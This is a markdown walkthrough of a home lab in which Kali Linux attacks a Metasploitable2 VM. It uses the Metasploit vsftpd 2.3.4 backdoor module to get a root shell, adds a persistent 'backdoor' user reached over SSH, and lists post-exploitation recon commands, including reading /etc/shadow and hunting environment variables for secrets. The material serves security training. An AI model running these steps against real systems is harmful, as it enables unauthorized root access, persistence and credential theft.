# Metasploit Exploit Walkthrough

This markdown contains a detailed walkthrough of the steps taken during this project using Kali Linux and Metasploitable2.


## 1. Lab Setup

- Imported Kali Linux (attacker) and Metasploitable2 (target) into VMWare
- Set both VMs to host-only adapter mode
- Verified network connectivity using the following command from Kali:

  -> bash
      - ping 192.168.xxx.xxx

## 2. Scan and Identify Open Ports
  -> bash
      - nmap -sV 192.168.xxx.xxx
      (This will show you available services (like FTP, Samba) on the target (Metasploitable2) VM.)

## 3. Exploit: vsftpd_234_backdoor
  -> bash
      - msfconsole
  Inside Metasploit: 
  -> bash
      - use exploit/unix/ftp/vsftpd_234_backdoor
      - set RHOSTS 192.168.xxx.xxx
      - run

  After execution, you’ll get a root shell via port 6200. You can confirm access with:
  -> bash
      - whoami

## 4. Post-Exploitation: Create a Backdoor User
  -> bash
      - adduser backdoor
      # if password setting does not automatically appear after this, type:
      - passwd backdoor  # and then set a password


## 5. SSH into Backdoored User
  From your Kali terminal:
  -> bash
      - ssh backdoor@192.168.xxx.xxx

  Use the password you set and confirm shell access:
  -> bash
      - whoami
      
## 6. Post Exploitation Recon Commands

  # 1. Check system info and kernel version
  uname -a

  # 2. See current user and UID
  whoami
  id

  # 3. View running processes (useful for finding services and privilege escalations)
  ps aux

  # 4. Check login users and session history
  w
  last

  # 5. Display network interfaces and IP configuration
  ifconfig
  # or for modern systems:
  ip a

  # 6. View open ports and listening services
  netstat -tulpn
  # or if not installed:
  ss -tulpn

  # 7. Review scheduled tasks (cron jobs)
  cat /etc/crontab
  ls -la /etc/cron.*

  # 8. List environment variables (check for misconfigurations or secrets)
  printenv

  # 9. Check installed software and version info
  dpkg -l
  # or if RPM-based:
  rpm -qa

  # 10. Explore user account info
  cat /etc/passwd
  cat /etc/shadow  # Requires root

